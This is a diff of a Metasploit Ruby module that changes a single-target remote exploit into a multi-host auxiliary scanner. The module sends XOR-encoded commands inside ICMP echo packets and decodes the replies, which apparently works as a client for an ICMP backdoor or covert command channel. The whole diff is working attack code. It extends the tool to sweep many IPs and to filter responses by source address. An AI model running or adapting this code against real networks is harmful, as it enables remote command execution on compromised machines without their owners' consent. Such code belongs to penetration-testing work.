@@ -5,10 +5,13 @@
 
 require 'msf/core'
 
-class Metasploit3 <  Msf::Exploit::Remote
+class Metasploit3 < Msf::Auxiliary
   Rank = ManualRanking
 
   include Msf::Exploit::Capture
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
     super(update_info(info,
@@ -41,13 +44,12 @@ class Metasploit3 <  Msf::Exploit::Remote
       ], self.class)
   end
 
-  def exploit
+  def run_host(ip)
     check_pcaprub_loaded
 
     open_pcap
     pcap = self.capture
-    capture_sendto(build_icmp(), datastore['RHOST'])
-    print_status("Packet sent.")
+    capture_sendto(build_icmp(ip), ip)
 
     data = ""
     begin
@@ -55,6 +57,7 @@ class Metasploit3 <  Msf::Exploit::Remote
         each_packet do |pkt|
           p = PacketFu::Packet.parse(pkt)
           next unless p.is_icmp?
+	  next unless p.ip_saddr == ip
     
           key = (p.icmp_sum & 0xff) ^ ((p.icmp_sum >> 8) & 0xff)
           decoded = p.payload.each_byte.map {|c| (c^key).chr }.join
@@ -68,16 +71,17 @@ class Metasploit3 <  Msf::Exploit::Remote
       # Ignore 
     end
 
-    if data.size > 0
-      print_good "Response received:\n#{data}"  
-    else
-      print_error "No response received."
-    end
     close_pcap
+
+    if data.size > 0
+	print_good("#{ip}: #{data}".chomp)
+    else
+      # print_error "No response received."
+    end
   end
 
 
-  def build_icmp()
+  def build_icmp(ip)
     chksum = rand(65535) + 1
     
     if datastore['CMD'].nil? || datastore['CMD'] == ''
@@ -96,7 +100,7 @@ class Metasploit3 <  Msf::Exploit::Remote
     p.icmp_type = 8
     p.icmp_code = 0
     p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
-    p.ip_daddr = datastore['RHOST']
+    p.ip_daddr = ip
     p.payload = capture_icmp_echo_pack(rand(65535) + 1, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
     p.recalc
     p.icmp_sum = chksum & 0xffff
